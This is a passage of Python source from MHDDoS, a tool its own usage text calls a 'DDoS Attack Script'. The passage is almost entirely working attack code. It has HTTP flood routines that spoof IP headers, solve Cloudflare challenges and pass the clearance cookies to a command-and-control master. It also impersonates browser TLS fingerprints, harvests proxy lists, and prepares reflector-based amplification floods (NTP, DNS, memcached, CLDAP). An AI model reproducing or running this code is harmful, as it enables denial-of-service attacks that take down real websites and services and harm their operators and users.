                        logger.warning(f"{bcolors.WARNING}[!] CFBUAM: Solve failed with proxy. Retrying without proxy...{bcolors.RESET}")
                        cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), user_agent=ua_target)

                    if cookie:
                        HttpFlood._cfbuam_cookie = cookie
                        if ua: HttpFlood._cfbuam_ua = ua
                        HttpFlood._cfbuam_expiry = now + 900 # 15 mins
                    else:
                        HttpFlood._cfbuam_cookie = "_yummy=choco" # Fallback
                        HttpFlood._cfbuam_expiry = now + 60    # Retry sooner if failed

        ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
        cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
        spoof = ProxyTools.Random.rand_ipv4().encode()
        ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()

        req = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n",
            cookie_bytes,
            b"Connection: ", self._conn_type_bytes, b"\r\n",
            b"User-Agent: ", ua_bytes, b"\r\n",
            b"Referer: ", ref, b"\r\n",
            self._fp_headers_bytes,
            b"X-Forwarded-For: ", spoof, b"\r\n",
            b"Client-IP: ", spoof, b"\r\n",
            b"Real-IP: ", spoof, b"\r\n",
            b"\r\n"
        ])
        
        # Broadcast bypass tokens to Master C2 if in worker mode and connected
        if _session_id and "cf_clearance" in HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
            import json
            # Print to stdout so worker.py can catch it and send via WS
            # We use a special tag that worker.py's monitor_process will parse
            print(f"__SYNC_BYPASS__||{json.dumps({'cookie': HttpFlood._cfbuam_cookie, 'ua': HttpFlood._cfbuam_ua})}")

        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, req)
        except Exception as e:
            # print("CFBUAM EXCEPTION:", repr(e))
            pass

    async def AVB(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await asyncio.sleep(max(self._rpc / 1000, 0.1))
                    await self._send_async(writer, payload, reader)
        except: pass

    async def DGB(self) -> None:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_DGB)

    def _sync_DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxy_pool:
                pro = self._proxy_pool.get_proxy()
                if pro:
                    with Tools.dgb_solver(
                        self._target.human_repr(),
                        randchoice(self._useragents),
                        pro.asRequest(),
                    ) as ss:
                        for _ in range(min(self._rpc, 5)):
                            sleep(min(self._rpc, 5) / 100)
                            with ss.get(
                                self._target.human_repr(),
                                proxies=pro.asRequest(),
                                timeout=5,
                            ) as res:
                                REQUESTS_SENT += 1
                                BYTES_SEND += Tools.sizeOfRequest(res)
                                continue
                    Tools.safe_close(ss)
                    return
            with Tools.dgb_solver(
                self._target.human_repr(), randchoice(self._useragents)
            ) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr(), timeout=5) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
            Tools.safe_close(ss)

    async def DYN(self) -> None:
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    spoof = ProxyTools.Random.rand_ipv4().encode()
                    ua = randchoice(self._useragents).encode()
                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
                    payload = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
                        b"Host: ", ProxyTools.Random.rand_str(6).encode(), b".", self._host_bytes, b"\r\n",
                        b"Connection: ", self._conn_type_bytes, b"\r\n",
                        b"User-Agent: ", ua, b"\r\n",
                        b"Referer: ", ref, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", spoof, b"\r\n",
                        b"Client-IP: ", spoof, b"\r\n",
                        b"Real-IP: ", spoof, b"\r\n\r\n"
                    ])
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def DOWNLOADER(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
                    while True:
                        data = await reader.read(1024)
                        if not data:
                            break
                await self._send_async(writer, b"0")
        except: pass

    async def BYPASS(self) -> None:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_BYPASS)

    def _sync_BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        for _ in range(self._rpc):
            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
            try:
                with requests.get(
                    self._target.human_repr(),
                    proxies=pro.asRequest() if pro else None,
                    timeout=5
                ) as res:
                    BYTES_SEND += len(res.content) + len(str(res.headers))
                    REQUESTS_SENT += 1
            except Exception:
                if pro and self._proxy_pool:
                    self._proxy_pool.report_failure(pro)

    async def GSB(self) -> None:
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    spoof = ProxyTools.Random.rand_ipv4().encode()
                    ua = randchoice(self._useragents).encode()
                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
                    payload = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b"?qs=", ProxyTools.Random.rand_str(6).encode(), b" HTTP/1.1\r\n",
                        b"Host: ", self._host_bytes, b"\r\n",
                        b"Connection: ", self._conn_type_bytes, b"\r\n",
                        b"User-Agent: ", ua, b"\r\n",
                        b"Referer: ", ref, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", spoof, b"\r\n",
                        b"Client-IP: ", spoof, b"\r\n",
                        b"Real-IP: ", spoof, b"\r\n\r\n"
                    ])
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def RHEX(self) -> None:
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    spoof = ProxyTools.Random.rand_ipv4().encode()
                    ua = randchoice(self._useragents).encode()
                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
                    randhex = randbytes(randchoice([32, 64, 128])).hex().encode()
                    payload = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b"/", randhex, b" HTTP/1.1\r\n",
                        b"Host: ", self._host_bytes, b"/", randhex, b"\r\n",
                        b"Connection: ", self._conn_type_bytes, b"\r\n",
                        b"User-Agent: ", ua, b"\r\n",
                        b"Referer: ", ref, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", spoof, b"\r\n",
                        b"Client-IP: ", spoof, b"\r\n",
                        b"Real-IP: ", spoof, b"\r\n\r\n"
                    ])
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def STOMP(self) -> None:
        hexh = b"A" * 1024 # Optimized stomp pattern
        p1 = b"".join([
            self._method_bytes, b" ", self._path_bytes, b"/", hexh, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n\r\n"
        ])
        p2 = b"".join([
            self._method_bytes, b" ", self._path_bytes, b"/cdn-cgi/l/chk_captcha HTTP/1.1\r\n",
            b"Host: ", hexh, b"\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                await self._send_async(writer, p1)
                for _ in range(self._rpc):
                    await self._send_async(writer, p2)
        except: pass

    async def NULL(self) -> None:
        payload = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n",
            b"User-Agent: null\r\n",
            b"Referrer: null\r\n",
            b"Connection: keep-alive\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def BOMB(self) -> None:
        if not self._proxy_pool or len(self._proxy_pool) == 0:
            exit("This method requires proxies.")
        while True:
            proxy = self._proxy_pool.get_proxy()
            if proxy and proxy.type != ProxyType.SOCKS4:
                break
        
        try:
            # Resolve bombardier path dynamically if possible, or use fallback
            bombardier_path = Path.home() / "go/bin/bombardier"
            process = await asyncio.create_subprocess_exec(
                str(bombardier_path), 
                f"--connections={self._rpc}",
                "--http2",
                "--method=GET",
                "--latencies",
                "--timeout=30s",
                f"--requests={self._rpc}",
                f"--proxy={proxy}",
                f"{self._target.human_repr()}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            if self._thread_id == 0 and stdout:
                print(proxy, stdout.decode(), sep="\n")
        except: pass

    async def SLOW(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
                while True:
                    await self._send_async(writer, payload, reader)
                    if not await reader.read(1):
                        break
                    for _ in range(self._rpc):
                        keep = str.encode(
                            "X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000)
                        )
                        await self._send_async(writer, keep)
                        await asyncio.sleep(self._rpc / 15)
                        break
        except: pass

    async def IMPERSONATE(self) -> None:
        """Deep TLS/JA3 Impersonation using curl-cffi."""
        if not CURL_CFFI_INSTALLED:
            logger.error("[!] curl-cffi not installed. IMPERSONATE method unavailable.")
            await asyncio.sleep(1)
            return

        from curl_cffi.requests import AsyncSession
        
        # Determine impersonate profile from UA or default to chrome120
        profile = "chrome120"
        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
        if "Firefox" in ua: profile = "safari15_5" # Safari is often a good generic fallback
        elif "Chrome" in ua: profile = "chrome120"
        
        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
        proxies = {"http": pro.asRequest()["http"], "https": pro.asRequest()["https"]} if pro else None
        
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if HttpFlood._cfbuam_cookie:
            headers["Cookie"] = HttpFlood._cfbuam_cookie

        try:
            async with AsyncSession(impersonate=profile, proxies=proxies, verify=False) as s:
                for _ in range(self._rpc):
                    try:
                        res = await s.get(self._target.human_repr(), headers=headers, timeout=10)
                        global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(res.content)
                        
                        code = str(res.status_code)
                        if code.startswith(('2', '3')): SUCCESS_SENT += 1
                        elif code.startswith('4'): WAF_SENT += 1
                        elif code.startswith('5'): ERROR_SENT += 1
                    except:
                        global TIMEOUT_SENT
                        TIMEOUT_SENT += 1
        except Exception:
            if pro and self._proxy_pool:
                self._proxy_pool.report_failure(pro)

    async def HTTP3(self) -> None:
        """HTTP/3 (QUIC) Flooding using httpx."""
        if not HTTPX_INSTALLED:
            logger.error("[!] httpx not installed. HTTP3 method unavailable.")
            await asyncio.sleep(1)
            return

        import httpx
        
        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
        # Note: httpx proxy support for HTTP3 might be limited depending on the transport
        # We use a standard client but enable http3
        
        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
        headers = {"User-Agent": ua}
        if HttpFlood._cfbuam_cookie:
            headers["Cookie"] = HttpFlood._cfbuam_cookie

        try:
            async with httpx.AsyncClient(http3=True, verify=False, follow_redirects=True) as client:
                for _ in range(self._rpc):
                    try:
                        res = await client.get(self._target.human_repr(), headers=headers, timeout=5)
                        global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(res.content)
                        
                        code = str(res.status_code)
                        if code.startswith(('2', '3')): SUCCESS_SENT += 1
                        elif code.startswith('4'): WAF_SENT += 1
                        elif code.startswith('5'): ERROR_SENT += 1
                    except:
                        global TIMEOUT_SENT
                        TIMEOUT_SENT += 1
        except Exception:
            pass


class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider
            for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or provider["type"] == 0 or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}"
            % len(providrs)
        )
        proxes: Set[Proxy] = set()
        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download,
                    provider,
                    (
                        ProxyType.stringToProxyType(str(provider["type"]))
                        if provider["type"] != 0
                        else None
                    ),
                )
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    if Proxy_type != 0 and pro.type != ProxyType.stringToProxyType(
                        str(Proxy_type)
                    ):
                        continue  # Skip mismatched types if user requested specific protocol
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: Optional[ProxyType]) -> Set[Proxy]:
        type_name = proxy_type.name if proxy_type else "ALL"
        url_or_path = provider["url"]
        logger.debug(
            f"{bcolors.WARNING}Proxies from (Source: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}){bcolors.RESET}"
            % (url_or_path, type_name)
        )
        proxes: Set[Proxy] = set()
        data = ""

        try:
            if str(url_or_path).startswith("http://") or str(url_or_path).startswith(
                "https://"
            ):
                data = get(url_or_path, timeout=provider["timeout"]).text
            else:
                p = Path(url_or_path)
                if p.exists() and p.is_file():
                    with p.open("r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                else:
                    logger.error(f"[!] Source not found or invalid: {url_or_path}")
                    return proxes

            if proxy_type:
                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
                    proxes.add(proxy)
            else:
                for line in data.splitlines():
                    p = Proxy.fromString(line.strip())
                    if p:
                        proxes.add(p)
        except Exception as e:
            logger.error(f"Download Proxy Error: {(e.__str__() or e.__repr__())}")
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"
        while 1:
            cmd = input(cons + " ").strip()
            if not cmd:
                continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)
            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue
            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)
            if cmd == "CLEAR":
                print("\033c")
                continue
            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue
            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)
                    while True:
                        sleep(1)
                        od, ld = ld, net_io_counters(pernic=False)
                        t = [(last - now) for now, last in zip(od, ld)]
                        logger.info(
                            (
                                "Bytes Sent %s\n"
                                "Bytes Received %s\n"
                                "Packets Sent %s\n"
                                "Packets Received %s\n"
                                "ErrIn %s\n"
                                "ErrOut %s\n"
                                "DropIn %s\n"
                                "DropOut %s\n"
                                "Cpu Usage %s\n"
                                "Memory %s\n"
                            )
                            % (
                                Tools.humanbytes(t[0]),
                                Tools.humanbytes(t[1]),
                                Tools.humanformat(t[2]),
                                Tools.humanformat(t[3]),
                                t[4],
                                t[5],
                                t[6],
                                t[7],
                                str(cpu_percent()) + "%",
                                str(virtual_memory().percent) + "%",
                            )
                        )
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue
            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f"{cons}give-me-ipaddress# ")
                        if not domain:
                            continue
                        if domain.upper() == "BACK":
                            break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {
                            "E",
                            "EXIT",
                            "Q",
                            "QUIT",
                            "LOGOUT",
                            "CLOSE",
                        }:
                            exit(-1)
                        if "/" not in domain:
                            continue
                        logger.info("please wait ...")
                        with get(domain, timeout=20) as r:
                            logger.info(
                                ("status_code: %d\nstatus: %s")
                                % (
                                    r.status_code,
                                    "ONLINE" if r.status_code <= 500 else "OFFLINE",
                                )
                            )
            if cmd == "INFO":
                while True:
                    domain = input(f"{cons}give-me-ipaddress# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    print("please wait ...", end="\r")
                    info = ToolsConsole.info(domain)
                    if not info["success"]:
                        print("Error!")
                        continue
                    logger.info(
                        ("Country: %s\nCity: %s\nOrg: %s\nIsp: %s\nRegion: %s\n")
                        % (
                            info["country"],
                            info["city"],
                            info["org"],
                            info["isp"],
                            info["region"],
                        )
                    )
            if cmd == "TSSRV":
                while True:
                    domain = input(f"{cons}give-me-domain# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    print("please wait ...", end="\r")
                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
            if cmd == "PING":
                while True:
                    domain = input(f"{cons}give-me-ipaddress# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(
                        ("Address: %s\nPing: %d\nAceepted Packets: %d/%d\nstatus: %s\n")
                        % (
                            r.address,
                            r.avg_rtt,
                            r.packets_received,
                            r.packets_sent,
                            "ONLINE" if r.is_alive else "OFFLINE",
                        )
                    )

    @staticmethod
    def stop():
        print("All Attacks has been Stopped !")
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print(
            (
                f"* MHDDoS v{__version__} - DDoS Attack Script With %d Methods\n"
                "Note: If the Proxy list is empty, The attack will run without proxies\n"
                "      If the Proxy file doesn't exist, the script will download proxies and check them.\n"
                "      Proxy Type 0 = All in config.json\n"
                "      SocksTypes:\n"
                "         - 6 = RANDOM\n"
                "         - 5 = SOCKS5\n"
                "         - 4 = SOCKS4\n"
                "         - 1 = HTTP\n"
                "         - 0 = ALL\n"
                " > Methods:\n"
                " - Layer4\n"
                " | %s | %d Methods\n"
                " - Layer7\n"
                " | %s | %d Methods\n"
                " - Tools\n"
                " | %s | %d Methods\n"
                " - Others\n"
                " | %s | %d Methods\n"
                " - All %d Methods\n"
                "\n"
                "Example:\n"
                "   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <refresh=optional>\n"
                "   L4: python3 %s <method> <ip:port> <threads> <duration>\n"
                "   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist> <refresh=optional>\n"
                "   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with"
                " Amplification)>\n"
            )
            % (
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                ", ".join(Methods.LAYER4_METHODS),
                len(Methods.LAYER4_METHODS),
                ", ".join(Methods.LAYER7_METHODS),
                len(Methods.LAYER7_METHODS),
                ", ".join(ToolsConsole.METHODS),
                len(ToolsConsole.METHODS),
                ", ".join(["TOOLS", "HELP", "STOP"]),
                3,
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                argv[0],
                argv[0],
                argv[0],
                argv[0],
            )
        )

    @staticmethod
    def ts_srv(domain):
        records, DnsResolver, Info = (
            ["_ts3._udp.", "_tsdns._tcp."],
            resolver.Resolver(),
            {},
        )
        DnsResolver.timeout, DnsResolver.lifetime = 1, 1
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, "SRV")
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip(".") + ":" + str(srv.port)
            except:
                Info[rec] = "Not found"
        return Info

    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_arg, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
        
    proxies = set()
    is_remote = str(proxy_arg).startswith(("http://", "https://"))
    
    if is_remote:
        logger.info(f"{bcolors.WARNING}[*] Resource: Synchronizing remote tactical assets from {bcolors.OKBLUE}{proxy_arg}{bcolors.RESET}")
        try:
            res = get(str(proxy_arg), timeout=15)
            if res.status_code != 200:
                raise Exception(f"HTTP {res.status_code}")
            
            data = res.text
            if proxy_ty == 0:
                for line in data.splitlines():
                    p = Proxy.fromString(line.strip())
                    if p: proxies.add(p)
            else:
                proxy_type_obj = ProxyType.stringToProxyType(str(proxy_ty))
                # Efficient Regex Parsing
                ip_port_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)")
                for match in ip_port_pattern.finditer(data):
                    proxies.add(Proxy(match.group(1), int(match.group(2)), proxy_type_obj))
            
            if not proxies:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Tactical failure - No active resources found at origin.{bcolors.RESET}")
            else:
                logger.info(f"{bcolors.OKGREEN}[*] Resource: Deployment successful. {len(proxies):,} active endpoints synchronized.{bcolors.RESET}")
        except Exception as e:
            logger.error(f"[!] Handshake Failed: {e}")
            if "ReloadSentinel" not in current_thread().name:
                exit(f"Origin Unreachable: {e}")
            return set()
    else:
        proxy_li = Path(proxy_arg)
        is_sentinel = "ReloadSentinel" in current_thread().name
        force_harvest = proxy_li.name == "auto_harvest.txt"
        
        if not proxy_li.exists() or force_harvest:
            if proxy_li.name == "auto_harvest.txt":
                action_type = "Refreshing" if is_sentinel else "Scraping"
                logger.info(f"{bcolors.OKCYAN}[*] Auto-Harvest: {action_type} global tactical matrices. Please stand by...{bcolors.RESET}")
            else:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset missing. Initializing emergency fallback sequence.{bcolors.RESET}")
            
            proxy_li.parent.mkdir(parents=True, exist_ok=True)
            all_raw_proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
            
            if not all_raw_proxies:
                if is_sentinel: return set()
                exit("Tactical Matrix Depleted. Check uplink.")
                
            total_found = len(all_raw_proxies)
            logger.info(f"{bcolors.OKBLUE}[*] Resource: Acquired {total_found:,} raw tactical assets. Forwarding to Tactical Scorer...{bcolors.RESET}")
            
            with proxy_li.open("w", encoding="utf-8") as wr:
                wr.write("\n".join(str(p) for p in all_raw_proxies))
            
            proxies = all_raw_proxies
        else:
            proxies = ProxyUtiles.readFromFile(proxy_li)
            if proxies:
                logger.info(f"{bcolors.OKGREEN}[*] Resource: {len(proxies):,} local endpoints active.{bcolors.RESET}")
            else:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset pool empty. Tactical profile limited.{bcolors.RESET}")
                
    return proxies



async def main_async():
    try:
        loop = asyncio.get_event_loop()
        loop.set_default_executor(SYNC_EXECUTOR)
        one = argv[1].upper()
        if one == "HELP":
            raise IndexError()
        if one == "TOOLS":
            await asyncio.to_thread(ToolsConsole.runConsole)
            return
        if one == "STOP":
            await asyncio.to_thread(ToolsConsole.stop)
            return
        
        method, event, proxy_pool, refresh_mins = one, asyncio.Event(), TacticalProxyPool(), 0
        event.clear()
        urlraw = argv[2].strip()
        if not urlraw.startswith("http"):
            urlraw = "http://" + urlraw
        if method not in Methods.ALL_METHODS:
            exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))

        # --- Parse --session-id for attack history tracking ---
        _session_id = None
        for i, arg in enumerate(argv):
            if arg == "--session-id" and i + 1 < len(argv):
                _session_id = argv[i + 1]
                break

        target_host = "Unknown"
        port = 80
        threads = 1
        timer = 3600

        if method in Methods.LAYER7_METHODS:
            url = URL(urlraw)
            target_host = url.host
            host = target_host
            if method != "TOR":
                try:
                    host = await asyncio.get_event_loop().run_in_executor(None, gethostbyname, target_host)
                except Exception as e:
                    exit("Hostname Unresolved: ", target_host, str(e))
            proxy_ty, threads, proxy_arg, rpc, timer = (
                int(argv[3]),
                int(argv[4]),
                argv[5].strip(),
                int(argv[6]),
                int(argv[7]),
            )
            
            # Global Flag Detection
            args_iter = iter(argv[8:])
            for arg in args_iter:
                if arg.isdigit():
                    refresh_mins = int(arg)
                elif arg == "--autoscale":
                    ENGINE_STATE.active_threads_target.value = threads
                elif arg == "--evasion":
                    pass
                elif arg == "--shared-cookie":
                    HttpFlood._cfbuam_cookie = next(args_iter, None)
                    HttpFlood._cfbuam_expiry = time() + 900 # Valid for 15 mins
                elif arg == "--shared-ua":
                    HttpFlood._cfbuam_ua = next(args_iter, None)

            proxy_li = (
                proxy_arg
                if proxy_arg.startswith("http")
                else Path(__dir__ / "files/proxies/" / proxy_arg)
            )
            useragent_li, referers_li, bombardier_path = (
                Path(__dir__ / "files/useragent.txt"),
                Path(__dir__ / "files/referers.txt"),
                Path.home() / "go/bin/bombardier",
            )
            if method == "BOMB":
                assert (
                    bombardier_path.exists()
                    or bombardier_path.with_suffix(".exe").exists()
                ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
            
            if not useragent_li.exists() or not referers_li.exists():
                exit("Critical Assets Missing (UA/Ref)")
            
            def _load_assets():
                with useragent_li.open("r", encoding="utf-8") as f:
                    u = [line.strip() for line in f if line.strip()]
                with referers_li.open("r", encoding="utf-8") as f:
                    r = [line.strip() for line in f if line.strip()]
                return set(u), set(r)

            uagents, referers = await asyncio.to_thread(_load_assets)
            
            if not uagents or not referers:
                exit("Critical Assets Empty")
            
            proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty, url)
            if proxies:
                tactical_proxies = await TacticalProxyValidator.validate_and_score(set(proxies), str(url) if url else None, is_layer7=True)
                await asyncio.to_thread(proxy_pool.update_pool, tactical_proxies)
            else:
                await asyncio.to_thread(proxy_pool.update_pool, [])
            
            if refresh_mins > 0:
                logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                sentinel = ReloadSentinel(refresh_mins, con, proxy_li, proxy_ty, proxy_pool, url)
                sentinel.start()
            
            logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L7 async tasks...{bcolors.RESET}")
            for thread_id in range(threads):
                flood = HttpFlood(
                    thread_id,
                    url,
                    host,
                    method,
                    rpc,
                    event,
                    uagents,
                    referers,
                    proxy_pool,
                )
                asyncio.create_task(flood.run())

        elif method in Methods.LAYER4_METHODS:
            target = URL(urlraw)
            port, target_host = target.port, target.host
            host = target_host
            try:
                host = await asyncio.get_event_loop().run_in_executor(None, gethostbyname, target_host)
            except Exception as e:
                exit("Hostname Unresolved: ", target_host, str(e))
            if not port:
                logger.warning("[!] Port Missing. Defaulting to 80.")
                port = 80
            if port > 65535 or port < 1:
                exit("Invalid Port Configuration")
            
            if (
                method
                in {
                    "NTP",
                    "DNS",
                    "RDP",
                    "CHAR",
                    "MEM",
                    "CLDAP",
                    "ARD",
                    "SYN",
                    "ICMP",
                }
                and not ToolsConsole.checkRawSocket()
            ):
                exit("Raw Socket Privilege Required")
            
            threads, timer, ref = int(argv[3]), int(argv[4]), None
            
            # Dynamic Flag Detection for L4
            for arg in argv[5:]:
                if arg == "--autoscale":
                    ENGINE_STATE.active_threads_target.value = threads
                elif arg == "--evasion":
                    pass

            if len(argv) >= 6:
                argfive = argv[5].strip()
                if argfive and not argfive.startswith("--"):
                    refl_li = Path(__dir__ / "files" / argfive)
                    if method in {
                        "NTP",
                        "DNS",
                        "RDP",
                        "CHAR",
                        "MEM",
                        "CLDAP",
                        "ARD",
                    }:
                        if not refl_li.exists():
                            exit("Reflector Asset Missing")
                        ref_data = await asyncio.to_thread(refl_li.open("r").read)
                        ref = set(a.strip() for a in Tools.IP.findall(ref_data))
                        if not ref:
                            exit("Reflector Asset Empty")
                    elif argfive.isdigit() and len(argv) >= 7:
                        proxy_ty, proxy_arg = int(argfive), argv[6].strip()
                        if len(argv) >= 8 and argv[7].isdigit():
                            refresh_mins = int(argv[7])
                        proxy_li = (
                            proxy_arg
                            if proxy_arg.startswith("http")
                            else Path(__dir__ / "files/proxies" / proxy_arg)
                        )
                        proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty)
                        if proxies:
                            tactical_proxies = await TacticalProxyValidator.validate_and_score(set(proxies), is_layer7=False)
